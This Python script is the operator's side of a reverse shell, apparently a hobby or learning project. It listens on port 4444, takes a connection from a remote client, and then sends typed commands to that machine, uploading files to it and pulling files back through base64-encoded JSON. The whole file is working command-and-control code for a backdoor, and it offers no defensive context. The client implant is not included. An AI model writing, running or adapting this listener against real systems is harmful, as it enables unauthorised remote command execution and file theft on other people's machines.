#!/usr/bin/python
# General - Connection to the client, able to send and recieve data. Testing on port 4444.
# General - json is used to manage serilisation to receive large data.


import socket
import json
import base64


class Listr:
    def __init__(self, addr, prt):
        listr = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # The bellow is to reuse a connection if it doesn't go down with the connection to.
        listr.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        print(addr)
        listr.bind((addr, prt))
        listr.listen(0)
        print("Connecting...") #testing
        self.conn, self.addrs = listr.accept()
        print("\nConnected to " + str(self.addrs) + "\n") #testing

    def send_data(self, data):
#        print("\ntype: " + str(type(data)) + " - data: " + str(data) + "\n") #testing
        json_data = json.dumps(data)
#        print("\ntype: " + str(type(json_data)) + " - json_data: " + json_data + "\n") #testing
        self.conn.sendall(json_data.encode())

    def rcve_data(self):
        json_data = ""
        while True:
            try:
#                print("exit 0") #testing
                json_data += self.conn.recv(1024).decode() # plus sign is necessary.
                if json_data == "" or json_data == b'':
#                   print("break: " + str(json_data)) #testing
                    break
#               print("exit 1" + " - json_data: " + str(json_data)) #testing
                return json.loads(json_data)
            except ValueError:               
                continue

    def exe_rmy(self, comm):
        self.send_data(comm)
        return self.rcve_data()

    def w_f(self, path, item):
        with open(path, "wb") as f:
            f.write(base64.b64decode(item))
            return "\nDownloaded"
    
    def r_f(self, path):
        # only r read plain text, with b reads binary. e.g.: open(path, "rb")
        with open(path, "rb") as f:
            return base64.b64encode(f.read()).decode()

    def run(self):
        while True:
            try:
                comm = input(f"({self.addrs}) $ ").split(" ")
                # Here, the file is appended to the file.
                if comm[0] == "upload":
                    comm.append(self.r_f(comm[1]))
                result = self.exe_rmy(comm)
                # while is to make sure if there is still connection
                while result == None:
                    result = self.exe_rmy(comm)
                if comm[0] == "download" and "[Bad command]" not in result:
                    result = self.w_f(comm[1], result.encode())
                print(f"\n{result}\n")
                # if "exit" in comm:
                #     self.send_data("test...")
            except FileNotFoundError as notfound:
                print(f"\n{notfound.strerror}\n")
                continue
            except (BrokenPipeError, ConnectionError) as cnerr:
                print(cnerr.strerror + " - Connection down")
                self.conn.close()
                exit()
            except Exception as excep:
                print("Something went wrong.")
        

my_listner = Listr('', 4444)
my_listner.run()